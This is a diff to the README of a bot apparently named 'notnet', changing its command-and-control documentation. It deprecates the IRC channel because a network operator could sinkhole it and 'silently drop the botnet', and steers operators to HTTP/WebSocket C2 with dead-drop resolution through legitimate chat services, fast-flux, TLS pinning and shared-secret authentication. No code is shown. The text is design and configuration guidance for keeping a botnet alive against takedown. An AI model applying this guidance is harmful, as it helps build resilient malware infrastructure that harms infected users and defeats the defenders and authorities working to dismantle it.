@@ -31,7 +31,7 @@ repository build system. Do not treat them as available targets.
 
 | Protocol  | Status | Auth |
 |-----------|--------|------|
-| IRC       | Implemented | Nick allowlist (`irc_auth_nicks`) + optional `irc_pass` |
+| IRC       | Deprecated (legacy) | Nick allowlist (`irc_auth_nicks`) + optional `irc_pass` |
 | HTTP      | Implemented | Shared secret echo (`c2_secret`) — commands rejected without it |
 | WebSocket | Implemented (RFC 6455 handshake) | Shared secret echo (`c2_secret`) |
 
@@ -39,6 +39,14 @@ repository build system. Do not treat them as available targets.
 - HTTP and WebSocket commands are accepted only from responses that echo the
   configured `c2_secret`. With no secret configured, HTTP/WS commands are
   rejected (fail-closed).
+- **IRC is deprecated** (off by default; re-enable with `irc_enabled=1`). A
+  bespoke IRC channel is trivially sinkholed — a single network operator can
+  seize the channel and silently drop the botnet — and the IRC protocol no
+  longer provides meaningful resilience. The code is kept for compatibility,
+  but the primary channels are HTTP/WS with **dead-drop resolution**
+  (`dead_drop_url=`) as the bootstrap, which routes C2 endpoints through
+  legitimate chat/text infrastructure instead of a dedicated, takedown-able
+  channel.
 - All three channels support TLS 1.2+ when built with `make TLS=1` and a
   certificate pin is configured (see Encryption).
 - All three channels support **fast-flux C2** (`flux_enabled=1`): the bot
@@ -142,7 +150,7 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `irc_channel` | `#notnet` | IRC channel to join |
 || `irc_pass` | *(none)* | IRC password (or `NOTNET_IRC_PASS` env var) |
 || `irc_auth_nicks` | *(none)* | Comma-separated authorized operator nicks |
-|| `irc_enabled` | auto | 0/1 — explicitly enable/disable IRC C2 |
+|| `irc_enabled` | 0 | 0/1 — IRC C2 is **deprecated** (trivially sinkholed; superseded by dead-drop resolution). Off by default; set 1 to re-enable the legacy channel |
 || `http_server` | `api.notnet.net` | HTTP C2 server |
 || `http_port` | `443` | HTTP C2 port |
 || `http_path` | `/api/v1/bot` | HTTP C2 path |
